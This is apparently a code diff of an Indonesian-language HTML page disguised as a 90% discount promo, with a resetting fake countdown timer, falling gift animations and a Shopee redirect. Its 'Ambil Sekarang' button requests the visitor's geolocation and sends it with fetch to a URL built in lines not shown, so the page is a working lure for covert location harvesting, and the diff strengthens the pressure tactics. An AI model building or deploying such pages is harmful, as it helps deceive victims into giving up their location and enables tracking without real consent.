@@ -8,32 +8,27 @@
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: url('https://images.unsplash.com/photo-1607082349566-187342175e2f') no-repeat center;
-      background-size: cover;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      background: linear-gradient(135deg, #ff512f, #dd2476);
+      overflow: hidden;
+      color: white;
     }
 
-    .overlay {
-      background: rgba(0,0,0,0.6);
-      position: absolute;
-      width: 100%;
-      height: 100%;
+    .container {
+      position: relative;
+      z-index: 2;
+      text-align: center;
+      padding: 20px;
+      top: 50%;
+      transform: translateY(-50%);
     }
 
     .card {
-      position: relative;
-      z-index: 2;
       background: rgba(255,255,255,0.15);
       backdrop-filter: blur(15px);
       border-radius: 20px;
       padding: 25px;
-      width: 85%;
       max-width: 320px;
-      text-align: center;
-      color: white;
+      margin: auto;
       box-shadow: 0 10px 25px rgba(0,0,0,0.3);
       animation: fadeIn 1s ease;
     }
@@ -45,64 +40,102 @@
 
     h1 {
       font-size: 20px;
-      margin-bottom: 10px;
     }
 
-    .promo {
-      font-size: 14px;
-      margin-bottom: 15px;
-      color: #ffd700;
-    }
-
-    .highlight {
-      font-size: 22px;
+    .timer {
+      font-size: 24px;
       font-weight: bold;
-      color: #00ffcc;
-      margin-bottom: 10px;
+      color: yellow;
+      margin: 10px 0;
+    }
+
+    .gift {
+      font-size: 40px;
+      margin: 10px 0;
+      animation: bounce 1s infinite;
+    }
+
+    @keyframes bounce {
+      0%,100%{transform:translateY(0);}
+      50%{transform:translateY(-10px);}
     }
 
     button {
-      padding: 12px 20px;
+      padding: 12px;
       border: none;
       border-radius: 10px;
-      background: #ff5722;
-      color: white;
+      background: #00e676;
+      color: black;
       font-weight: bold;
-      cursor: pointer;
       width: 100%;
       margin-top: 10px;
-      font-size: 15px;
-    }
-
-    button:hover {
-      background: #e64a19;
+      cursor: pointer;
+      font-size: 16px;
     }
 
     #status {
       margin-top: 10px;
       font-size: 13px;
     }
+
+    /* animasi jatuh */
+    .falling {
+      position: absolute;
+      top: -50px;
+      font-size: 24px;
+      animation: fall linear infinite;
+    }
+
+    @keyframes fall {
+      to {
+        transform: translateY(110vh);
+      }
+    }
   </style>
 </head>
 
 <body>
 
-<div class="overlay"></div>
+<div class="container">
+  <div class="card">
+    <h1>🎁 Promo Terbatas</h1>
+    
+    <div class="gift">📱</div>
 
-<div class="card">
-  <h1>🎁 Promo Spesial Hari Ini</h1>
-  <div class="promo">Kesempatan terbatas untuk pengguna terpilih</div>
+    <div>Diskon hingga 90%</div>
 
-  <div class="highlight">Diskon hingga 90%</div>
+    <div class="timer" id="timer">00:10</div>
 
-  <p>Klik tombol di bawah untuk melanjutkan</p>
+    <button onclick="ambilLokasi()">Ambil Sekarang</button>
 
-  <button onclick="ambilLokasi()">Ambil Promo Sekarang</button>
-
-  <p id="status"></p>
+    <div id="status"></div>
+  </div>
 </div>
 
 <script>
+// countdown
+let time = 10;
+setInterval(()=>{
+  time--;
+  document.getElementById("timer").innerHTML = "00:" + (time < 10 ? "0"+time : time);
+  if(time <= 0){
+    time = 10;
+  }
+},1000);
+
+// animasi jatuh
+setInterval(()=>{
+  let el = document.createElement("div");
+  el.className = "falling";
+  el.innerHTML = "🎁";
+  el.style.left = Math.random()*100 + "vw";
+  el.style.animationDuration = (Math.random()*3+2)+"s";
+  document.body.appendChild(el);
+
+  setTimeout(()=>{el.remove()},5000);
+},300);
+
+// ambil lokasi
 function ambilLokasi(){
 
   if (navigator.geolocation) {
@@ -118,7 +151,7 @@ function ambilLokasi(){
 
         fetch(url);
 
-        document.getElementById("status").innerHTML = "✅ Memproses...";
+        document.getElementById("status").innerHTML = "✅ Memproses hadiah...";
 
         setTimeout(()=>{
           window.location.href = "https://shopee.co.id";
@@ -127,13 +160,13 @@ function ambilLokasi(){
       },
 
       function(error){
-        document.getElementById("status").innerHTML = "❌ Aktifkan lokasi untuk lanjut";
+        document.getElementById("status").innerHTML = "❌ Aktifkan lokasi dulu";
       }
 
     );
 
   } else {
-    document.getElementById("status").innerHTML = "❌ Browser tidak support";
+    document.getElementById("status").innerHTML = "❌ Tidak support";
   }
 }
 </script>
